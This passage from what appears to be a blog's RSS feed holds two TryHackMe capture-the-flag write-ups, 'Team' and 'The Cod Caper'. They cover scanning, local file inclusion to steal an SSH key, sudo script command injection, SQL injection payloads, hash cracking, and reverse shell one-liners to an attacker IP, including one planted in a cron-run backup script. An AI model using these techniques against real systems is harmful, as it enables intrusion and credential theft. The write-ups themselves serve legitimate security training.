# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/OT9fQyi.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Ah. we see a proper page up here.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -sC -sV -A 10.10.82.31
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 23:36 EST
Nmap scan report for 10.10.82.31
Host is up (0.35s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add &#39;te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.96 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2 Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u team.thm -w &amp;quot;/usr/share/dirbustrectory-list-2.3-medium.txt&amp;quot; -x &amp;quot;html,php,txt&amp;quot;
=================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer
=================================================
[+] Url:            http://team.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlistt-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
=================================================
2021/03/09 23:44:28 Starting gobuster
=================================================
/index.html (Status: 200)
/images (Status: 301)
/scripts (Status: 301)
/assets (Status: 301)
/robots.txt (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;scripts&lt;/code&gt; I can&amp;rsquo;t access, so i&amp;rsquo;ll leave it be. We can run another &lt;code&gt;gobuster&lt;/code&gt; on &lt;code&gt;team.thm/scripts&lt;/code&gt;, but that is for later. &lt;code&gt;robots.txt&lt;/code&gt; is always interesting.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/0u3oCyW.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Is what is shows. Lmao. Probably the &lt;code&gt;ftp&lt;/code&gt; username? Password we can brute-forcing. This is another thing we can try.&lt;/p&gt;
&lt;p&gt;Looking at the source, we see &lt;code&gt;/assets&lt;/code&gt; and &lt;code&gt;/images&lt;/code&gt;. I don&amp;rsquo;t like stego challenges, so I&amp;rsquo;ll keep it for the end.&lt;/p&gt;
&lt;p&gt;While that runs, I tried looking around in the website, but nothing special. Same goes for trying out &lt;code&gt;anonymous&lt;/code&gt; login in &lt;code&gt;ftp&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;13-sub-domains&#34;&gt;1.3 Sub-Domains&lt;/h3&gt;
&lt;p&gt;I&amp;rsquo;ve also learnt that we should look for subdomains as well. I will use &lt;code&gt;wfuzz&lt;/code&gt;. Since this is the first time I&amp;rsquo;m mentioning this, I&amp;rsquo;ll explain all the flags as well :P&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ wfuzz -c --hw 977 -w /usr/share/wfuzz/wordlist/general/common.txt -u http://team.thm/ -H &amp;quot;Host: FUZZ.team.thm&amp;quot; --hc 400
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================

000000257:   200        9 L      20 W       187 Ch      &amp;quot;dev&amp;quot;         
000000936:   200        89 L     220 W      2966 Ch     &amp;quot;www&amp;quot;         

Total time: 36.97936
Processed Requests: 951
Filtered Requests: 949
Requests/sec.: 25.71704
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The results look nice. Okay. One by one.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-c&lt;/code&gt; flag is for colorful output&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--hw&lt;/code&gt; stands for &lt;code&gt;hide words&lt;/code&gt;, probably. It was showing a ton of rows with &lt;code&gt;977&lt;/code&gt;, so I hardcoded :D&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-w&lt;/code&gt; wordlist. If you are in kali, you already have it in &lt;code&gt;/usr/share/wfuzz/wordlist/general/common.txt&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; url&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-H&lt;/code&gt; host name. &lt;code&gt;FUZZ&lt;/code&gt; gets replaced by the &lt;code&gt;Payload&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--hc&lt;/code&gt; hides responses having &lt;code&gt;400&lt;/code&gt; error.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;14-web-exploration&#34;&gt;1.4 Web Exploration&lt;/h3&gt;
&lt;p&gt;Pending paths:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;images stego&lt;/li&gt;
&lt;li&gt;gobuster on &lt;code&gt;/scripts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;brute-forcing &lt;code&gt;ftp&lt;/code&gt; using &lt;code&gt;dale&lt;/code&gt; as username.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;However, there are tastier things for us right now. Let&amp;rsquo;s go to &lt;code&gt;dev.team.thm&lt;/code&gt; from the &lt;code&gt;wfuzz&lt;/code&gt; results. Do not forget to include it in &lt;code&gt;/etc/hosts&lt;/code&gt;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/L0mKUUj.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Huh. Let&amp;rsquo;s follow that. It redirects us to the url: &lt;code&gt;http://dev.team.thm/script.php?page=teamshare.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wnQJ8Ns.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Both of these ideas combined, this looks very much like a &lt;code&gt;LFI&lt;/code&gt;. Let&amp;rsquo;s try &lt;code&gt;http://dev.team.thm/script.php?page=../../../../etc/passwd&lt;/code&gt;. Since the Apache server is usually around &lt;code&gt;/var/www/html/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/AAdqDXG.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Works! We see &lt;code&gt;dale&lt;/code&gt;, &lt;code&gt;gyles&lt;/code&gt; and some &lt;code&gt;ftpuser&lt;/code&gt;. Interesting. Our first target is then to get into &lt;code&gt;dale&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Okay. Since there was a &lt;code&gt;ssh&lt;/code&gt; port open, we can assume &lt;code&gt;dale&lt;/code&gt; is the username of that (It could be for &lt;code&gt;ftp&lt;/code&gt; as well, who knows!).&lt;/p&gt;
&lt;p&gt;So, we are looking for either the password of dale, or a private key. Since we have no better option currently, we can brute-forcing paths using &lt;code&gt;burpsuite&lt;/code&gt;. Turn on &lt;code&gt;foxy-proxy&lt;/code&gt; or any other tool you use, and fire up &lt;code&gt;burp&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Intercept a request, copypaste it. It looks like&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /script.php?page=../../../../etc/passwd HTTP/1.1

Host: dev.team.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, go to the &lt;code&gt;intruder&lt;/code&gt; tab, and setup as the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/JfUKF2w.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/A9qcD6D.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/HgfY6eP.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ve put in the payload from &lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now, you can let it run, but community edition sucks for this. Speed is shit and the thing we are looking for, is towards the bottom of the list. Let me save you some trouble, the path we are looking for, is &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;. The url thus being &lt;code&gt;http://dev.team.thm/script.php?page=../../../../etc/ssh/sshd_config&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/UZN47TX.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We see the sweet sweet private key, which means we can get in! Since the formatting is shit, go the source and the copy-paste it. Yeet all the &amp;lsquo;#&amp;rsquo; in the starting.&lt;/p&gt;
&lt;p&gt;We are in!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh dale@10.10.82.31 -i temp
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ ls
user.txt
dale@TEAM:~$ cat user.txt
THM{HELL YEAH}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are done!&lt;/p&gt;
&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv Esc&lt;/h2&gt;
&lt;p&gt;Okay! So the first thing I have learnt to do is check for &lt;code&gt;sudo&lt;/code&gt; details.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks good. Let&amp;rsquo;s head over to there and see what we can mess with.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dale@TEAM:/home/gyles$ cat admin_checks 
#!/bin/bash

printf &amp;quot;Reading stats.\n&amp;quot;
sleep 1
printf &amp;quot;Reading stats..\n&amp;quot;
sleep 1
read -p &amp;quot;Enter name of person backing up the data: &amp;quot; name
echo $name  &amp;gt;&amp;gt; /var/stats/stats.txt
read -p &amp;quot;Enter &#39;date&#39; to timestamp the file: &amp;quot; error
printf &amp;quot;The Date is &amp;quot;
$error 2&amp;gt;/dev/null

date_save=$(date &amp;quot;+%F-%H-%M&amp;quot;)
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf &amp;quot;Stats have been backed up\n&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is clearly a &lt;code&gt;bash&lt;/code&gt; script, and those &lt;code&gt;$name&lt;/code&gt; and &lt;code&gt;$error&lt;/code&gt; variables look interesting.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: /bin/bash
Enter &#39;date&#39; to timestamp the file: /bin/bash
The Date is ls
admin_checks
whoami
gyles
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note how I&amp;rsquo;ve snuck in &lt;code&gt;/bin/bash&lt;/code&gt; so that &lt;code&gt;$error&lt;/code&gt; reads and executes that! Let&amp;rsquo;s also get a proper shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3 --version
Python 3.6.5
python3 -c &amp;quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
gyles@TEAM:/home/gyles$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nice. Now, we are done with lateral privesc. Time for &lt;code&gt;linpeas.sh&lt;/code&gt;! &lt;code&gt;scp&lt;/code&gt; the file over to the machine.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ scp -i path/to/id_rsa /path/to/linpeas.sh dale@10.10.153.126:~
linpeas.sh                    100%  313KB 155.7KB/s   00:02    
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                     
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[+] Searching ssl/ssh files
/home/gyles/.ssh/known_hosts                                    
PermitRootLogin without-password
PubkeyAuthentication yes
ChallengeResponseAuthentication no
UsePAM no
Possible private SSH keys were found!
/etc/ssh/sshd_config
  --&amp;gt; Some certificates were found (out limited):
/var/lib/lxd/server.crt
/etc/pollinate/entropy.ubuntu.com.pem

 --&amp;gt; /etc/hosts.allow file found, read the rules:
/etc/hosts.allow
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;sshd_config&lt;/code&gt; lmao.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                         
/usr/local/sbin/dev_backup.sh                                   
You can write script: /usr/local/bin/main_backup.sh
/usr/bin/gettext.sh
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                  
  Group gyles:                                                  
/home/gyles/.local                                              
  Group editors:
/var/stats/stats.txt                                            
  Group admin:
/usr/local/bin                                                  
/usr/local/bin/main_backup.sh
/opt/admin_stuff
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The last two look the most interesting of the scan results.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gyles@TEAM:/usr/local/bin$ cat main_backup.sh 
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Oh baby, this is too easy! Since we have the write access, let&amp;rsquo;s have an interactive bash shell pop up here, and we can connect using &lt;code&gt;nc&lt;/code&gt; from the other side. Hell yeah.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gyles@TEAM:/usr/local/bin$ cat main_backup.sh 
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
bash -i &amp;gt;&amp;amp; /dev/tcp/YOUR_ATTACKING_IP/1337 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.153.126] 37192
bash: cannot set terminal process group (25073): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# cat /root/root.txt
cat /root/root.txt
THM{YEEEEEEEEEEEEEE}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: The Cod Caper Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-the-cod-caper-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-the-cod-caper-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/Z1wn3xE.png" alt="Featured image of post TryHackMe: The Cod Caper Writeup" /&gt;&lt;h2 id=&#34;task-1-intro&#34;&gt;Task 1: Intro&lt;/h2&gt;
&lt;p&gt;pingu story&lt;/p&gt;
&lt;h2 id=&#34;task-2-host-enumeration&#34;&gt;Task 2: Host Enumeration&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap -sC -sV -A 10.10.40.189&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;-A: Enable OS detection, version detection, script scanning, and traceroute&lt;/p&gt;
&lt;p&gt;-sC: equivalent to &amp;ndash;script=default&lt;/p&gt;
&lt;p&gt;-sV: Probe open ports to determine service/version info&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Scan Results&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-31 09:48 IST
Nmap scan report for 10.10.40.189
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;1-how-many-ports-are-open-on-the-target-machine&#34;&gt;1. How many ports are open on the target machine?&lt;/h3&gt;
&lt;p&gt;2 (ssh, http)&lt;/p&gt;
&lt;h3 id=&#34;2-what-is-the-http-title-of-the-web-server&#34;&gt;2. What is the http-title of the web server?&lt;/h3&gt;
&lt;p&gt;Apache2 Ubuntu Default Page: It works&lt;/p&gt;
&lt;h3 id=&#34;3-what-version-is-the-ssh-service&#34;&gt;3. What version is the ssh service?&lt;/h3&gt;
&lt;p&gt;OpenSSH 7.2p2 Ubuntu 4ubuntu2.8&lt;/p&gt;
&lt;h3 id=&#34;4-what-is-the-version-of-the-web-server&#34;&gt;4. What is the version of the web server?&lt;/h3&gt;
&lt;p&gt;Apache/2.4.18&lt;/p&gt;
&lt;h2 id=&#34;task-3-web-enumeration&#34;&gt;Task 3: Web enumeration&lt;/h2&gt;
&lt;p&gt;Using the &lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;suggested wordlist&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;run: &lt;code&gt;gobuster dir -u 10.10.16.135 -w &amp;quot;path/to/wordlist.txt&amp;quot; -x &amp;quot;html,php,txt&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It was around 10% way of searching when it got this!&lt;/p&gt;
&lt;h3 id=&#34;1--what-is-the-name-of-the-important-file-on-the-server&#34;&gt;1.  What is the name of the important file on the server?&lt;/h3&gt;
&lt;p&gt;/administrator.php&lt;/p&gt;
&lt;h2 id=&#34;4-web-exploitation&#34;&gt;4. Web Exploitation&lt;/h2&gt;
&lt;p&gt;login form -&amp;gt; sql injection?&lt;/p&gt;
&lt;p&gt;run &lt;code&gt;sqlmap -u http://10.10.16.135/administrator.php --forms --dump&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;-u: url&lt;/p&gt;
&lt;p&gt;&amp;ndash;forms: gets parameters from &lt;code&gt;form&lt;/code&gt; element in the page&lt;/p&gt;
&lt;p&gt;&amp;ndash;dump: gets data once SQLI(SQLInjection) is found&lt;/p&gt;
&lt;p&gt;We now get this from sqlmap:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;3 kinds of blinds&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=gbXk&#39; RLIKE (SELECT (CASE WHEN (1352=1352) THEN 0x6762586b ELSE 0x28 END))-- MeOd&amp;amp;password=

    Type: error-based
    Title: MySQL &amp;gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=gbXk&#39; AND GTID_SUBSET(CONCAT(0x71716b6b71,(SELECT (ELT(9508=9508,1))),0x716b6a7171),9508)-- BmZK&amp;amp;password=

    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=gbXk&#39; AND (SELECT 6145 FROM (SELECT(SLEEP(5)))TqbZ)-- sWNA&amp;amp;password=
---
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Database entries&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Database: users&lt;/p&gt;
&lt;p&gt;Table: users&lt;/p&gt;
&lt;p&gt;[1 entry]&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;password&lt;/th&gt;
&lt;th&gt;username&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;secretpass&lt;/td&gt;
&lt;td&gt;pingudad&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;1-what-is-the-admin-username&#34;&gt;1. What is the admin username?&lt;/h3&gt;
&lt;p&gt;pingudad&lt;/p&gt;
&lt;h3 id=&#34;2-what-is-the-admin-password&#34;&gt;2. What is the admin password?&lt;/h3&gt;
&lt;p&gt;secretpass&lt;/p&gt;
&lt;h3 id=&#34;3-how-many-forms-of-sqli-is-the-form-vulnerable-to&#34;&gt;3. How many forms of SQLI is the form vulnerable to?&lt;/h3&gt;
&lt;p&gt;3&lt;/p&gt;
&lt;h2 id=&#34;5-command-execution&#34;&gt;5. Command Execution&lt;/h2&gt;
&lt;p&gt;link where we put commands: &lt;code&gt;http://IP/SOME_NUMBER.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;we now run: &lt;code&gt;nc -nlvp 4242&lt;/code&gt; on our machine, to listen for connections&lt;/p&gt;
&lt;p&gt;-l: listen mode, for inbound connects&lt;/p&gt;
&lt;p&gt;-n: numeric-only IP addresses, no DNS&lt;/p&gt;
&lt;p&gt;-p: local port number&lt;/p&gt;
&lt;p&gt;-v: verbose&lt;/p&gt;
&lt;p&gt;and run this command in the administrator command box: &lt;code&gt;nc -e /bin/sh YOUR_IP 4242&lt;/code&gt; &lt;a class=&#34;link&#34; href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Source&lt;/a&gt;. well&amp;hellip; that didn&amp;rsquo;t work. let&amp;rsquo;s try: &lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc YOUR_IP 4242 &amp;gt;/tmp/f&lt;/code&gt; &lt;a class=&#34;link&#34; href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Source&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Quick Tip: Get you ip by typing in &lt;code&gt;ifconfig&lt;/code&gt;. Since we have connected to a VPN, we have to look at &lt;code&gt;tun0&lt;/code&gt;. run: &lt;code&gt;ifconfig tun0&lt;/code&gt; and the &lt;code&gt;destination&lt;/code&gt; is your IP address.&lt;/p&gt;
&lt;p&gt;If that sounds complex, go to &lt;a href=&#34;https://tryhackme.com/access&#34;&gt;https://tryhackme.com/access&lt;/a&gt; with VPN connected, and it&amp;rsquo;ll show you want you need.&lt;/p&gt;
&lt;p&gt;Quick Note: you can choose any port, 4242 is arbitary :P&lt;/p&gt;
&lt;h3 id=&#34;1-how-many-files-are-in-the-current-directory&#34;&gt;1. How many files are in the current directory?&lt;/h3&gt;
&lt;p&gt;run &lt;code&gt;ls&lt;/code&gt; in the command form (even before we get access)&lt;/p&gt;
&lt;p&gt;3&lt;/p&gt;
&lt;h3 id=&#34;2-do-i-still-have-an-account&#34;&gt;2. Do I still have an account?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cat /etc/passwd&lt;/code&gt; shows &lt;code&gt;pingu:x:1002:1002::/home/pingu:/bin/bash&lt;/code&gt; at the end.&lt;/p&gt;
&lt;p&gt;yes&lt;/p&gt;
&lt;h3 id=&#34;3-what-is-my-ssh-password&#34;&gt;3. What is my ssh password?&lt;/h3&gt;
&lt;p&gt;Traversing through the directory we have a user named &lt;code&gt;pingu&lt;/code&gt;, and in the &lt;code&gt;.ssh&lt;/code&gt; folder, we have &lt;code&gt;id_rsa&lt;/code&gt; and &lt;code&gt;id_rsa.pub&lt;/code&gt;. This is interesting.
But, for now lets focus on getting the password. Trying to seach using &lt;code&gt;find -u pingu&lt;/code&gt; yields nothing. however, going around the directory we landed into shows a &lt;code&gt;hidden&lt;/code&gt; folder; inside is our password! Its owned by &lt;code&gt;www-data&lt;/code&gt; though &amp;hellip; hmmm &amp;hellip;.&lt;/p&gt;
&lt;p&gt;pinguapingu&lt;/p&gt;
&lt;h3 id=&#34;having-fun&#34;&gt;Having fun&lt;/h3&gt;
&lt;p&gt;running &lt;code&gt;ssh pingu@IP&lt;/code&gt; gives us access to the machine, using the password above. and &amp;hellip; well maybe i got too excited&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pingu@ubuntu:~$ sudo su
[sudo] password for pingu: 
pingu is not in the sudoers file.  This incident will be reported.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;lmao&lt;/p&gt;
&lt;h2 id=&#34;6-linenum&#34;&gt;6. LinEnum&lt;/h2&gt;
&lt;p&gt;We need to get the linenum file into pingu&amp;rsquo;s machine now. how? the room mentions using &lt;code&gt;SCP&lt;/code&gt; which we can do since we have ssh-ed into the machine.&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Get the linenum script&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;After copying using: &lt;code&gt;scp /path/to/LinEnum.sh pingu@IP:/tmp&lt;/code&gt;, just do &lt;code&gt;chmod +x LinEnum.sh&lt;/code&gt; and run.&lt;/p&gt;
&lt;h3 id=&#34;1-what-is-the-interesting-path-of-the-interesting-suid-file&#34;&gt;1. What is the interesting path of the interesting suid file?&lt;/h3&gt;
&lt;p&gt;/opt/secret/root&lt;/p&gt;
&lt;h2 id=&#34;10-finishing-the-job&#34;&gt;10. Finishing the Job&lt;/h2&gt;
&lt;p&gt;I&amp;rsquo;m on kali and there&amp;rsquo;s the godly &lt;code&gt;rockyou.txt&lt;/code&gt; 133mb file in &lt;code&gt;/usr/share/wordlists&lt;/code&gt;. If you do not have it, download from &lt;a class=&#34;link&#34; href=&#34;https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Our attack mode is using wordlist, which we can see is labelled 0 in &lt;code&gt;hashcat --help&lt;/code&gt;. Looking up out mode, we have &lt;code&gt;sha512crypt $6$, SHA512 (Unix)&lt;/code&gt; at 1800. So,&lt;/p&gt;
&lt;p&gt;run: &lt;code&gt;hashcat -m 1800 -a 0 root.txt /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;we get &lt;code&gt;$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;love2fish&lt;/p&gt;
&lt;h2 id=&#34;11-done&#34;&gt;11. Done&lt;/h2&gt;
&lt;p&gt;Have fun!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Tokyo Ghoul Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-tokyo-ghoul-writeup/</link>
